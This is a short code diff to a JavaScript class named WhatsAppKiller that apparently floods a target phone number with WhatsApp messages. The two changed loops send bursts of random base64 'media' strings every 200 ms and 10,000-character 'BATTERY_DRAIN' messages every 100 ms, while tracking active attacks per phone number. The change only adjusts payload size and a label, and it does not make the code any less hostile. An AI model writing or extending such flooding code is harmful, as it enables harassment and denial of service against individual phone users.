@@ -346,7 +346,7 @@ class WhatsAppKiller {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
                 for (let i = 0; i < 5; i++) {
-                    await this.sendWhatsAppMessage(phone, `📸 Media_${i}_${crypto.randomBytes(5000).toString('base64').substring(0, 500)}`);
+                    await this.sendWhatsAppMessage(phone, `📸 Media_${i}_${crypto.randomBytes(500).toString('base64').substring(0, 500)}`);
                 }
                 attempts += 5;
                 await this.sleep(200);
@@ -417,7 +417,7 @@ class WhatsAppKiller {
         while (Date.now() - startTime < duration * 1000) {
             if (!this.activeAttacks.get(phone)?.active) break;
             try {
-                await this.sendWhatsAppMessage(phone, '🔋 DRAIN_' + 'A'.repeat(10000));
+                await this.sendWhatsAppMessage(phone, '🔋 BATTERY_DRAIN_' + 'A'.repeat(10000));
                 attempts++;
                 await this.sleep(100);
             } catch (e) {}
